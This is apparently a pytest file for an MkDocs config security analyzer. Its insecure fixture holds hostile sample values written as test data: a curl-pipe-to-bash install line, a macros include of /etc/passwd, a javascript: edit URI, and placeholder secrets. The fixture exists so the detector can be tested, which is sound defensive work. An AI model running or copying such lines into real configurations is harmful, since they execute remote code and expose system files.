"""Tests for MkDocsAnalyzer."""

from pathlib import Path

from devai.mkdocs_analyzer import MkDocsAnalyzer, MkDocsFinding

HARDENED_CONFIG = """\
site_name: My Docs
site_url: https://example.com/docs/
repo_url: https://github.com/org/repo
strict: true

theme:
  name: material

plugins:
  - search
  - privacy
  - validation

markdown_extensions:
  - pymdownx.snippets:
      check_paths: true
      base_path: docs/snippets

dev_addr: 127.0.0.1:8000
"""

INSECURE_CONFIG = """\
site_name: Leaky Docs
site_url: http://example.com/docs/
repo_url: http://github.com/org/repo
edit_uri: javascript:alert(1)
strict: false

hooks:
  - my_untrusted_hooks

theme:
  name: git+https://github.com/org/theme.git

extra_javascript:
  - https://cdn.example.com/analytics.js

extra_css:
  - http://cdn.example.com/style.css

plugins:
  - search
  # - privacy

markdown_extensions:
  - pymdownx.snippets:
      base_path: .

google_analytics: UA-123456-1
api_key: supersecret123
AKIAIOSFODNN7EXAMPLE
script: curl http://example.com/install.sh | bash

macros:
  include_yaml: /etc/passwd
"""


class TestMkDocsAnalyzer:
    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "mkdocs.yml").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = MkDocsAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "hooks_enabled" in kinds
        assert "hook_module" in kinds
        assert "dev_addr_public" not in kinds
        assert "strict_disabled" in kinds
        assert "external_asset" in kinds
        assert "remote_theme" in kinds
        assert "unpinned_git_theme" in kinds
        assert "snippets_base_path_broad" in kinds
        assert "dangerous_uri" in kinds
        assert "google_analytics_legacy" in kinds
        assert "privacy_disabled" in kinds
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "curl_pipe_shell" in kinds
        assert "macros_external_include" in kinds
        assert analyzer.stats.config_files == 1

    def test_dev_addr_public(self, tmp_path: Path):
        (tmp_path / "mkdocs.yml").write_text(
            "site_name: Docs\ndev_addr: 0.0.0.0:8000\n",
            encoding="utf-8",
        )
        analyzer = MkDocsAnalyzer(str(tmp_path))
        assert any(f.kind == "dev_addr_public" for f in analyzer.analyze())

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "mkdocs.yml").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = MkDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_full_score(self, tmp_path: Path):
        analyzer = MkDocsAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = MkDocsFinding(
            kind="hooks_enabled",
            severity="high",
            message="test message",
            path="mkdocs.yml",
            lineno=3,
        )
        assert "mkdocs.yml:3" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "mkdocs.yml").write_text(HARDENED_CONFIG, encoding="utf-8")
        context = MkDocsAnalyzer(str(tmp_path)).to_context()
        assert "mkdocs config analysis" in context
        assert "health score" in context

    def test_yaml_extension(self, tmp_path: Path):
        (tmp_path / "mkdocs.yaml").write_text(
            "site_name: Docs\nstrict: false\n",
            encoding="utf-8",
        )
        analyzer = MkDocsAnalyzer(str(tmp_path))
        assert any(f.kind == "strict_disabled" for f in analyzer.analyze())

    def test_generate_hardened_template(self):
        template = MkDocsAnalyzer(".").generate_hardened_template()
        assert "strict: true" in template
        assert "privacy" in template
        assert "127.0.0.1:8000" in template
